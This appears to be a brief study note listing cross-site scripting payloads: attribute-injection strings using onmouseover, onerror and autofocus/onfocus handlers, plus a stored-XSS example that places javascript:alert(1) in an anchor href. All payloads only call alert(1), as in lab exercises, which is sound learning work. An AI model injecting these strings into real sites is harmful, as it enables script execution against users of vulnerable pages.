[Xss payloards]

1. cross-site scripting attack that injects an attribute and calls the alert function. 

Basic attribute injection
" onmouseover="alert(1)

Using an image error handler
" onerror="alert(1)" src=x

Input field autofocus trigger
" autofocus onfocus="alert(1)

2.Stored XSS into anchor href attribute with double quotes HTML-encoded

Vulnerable context (simplified)
<a href="USER_INPUT">Author Name</a>

Your stored input
javascript:alert(1)

Rendered output
<a href="javascript:alert(1)">YourName</a>

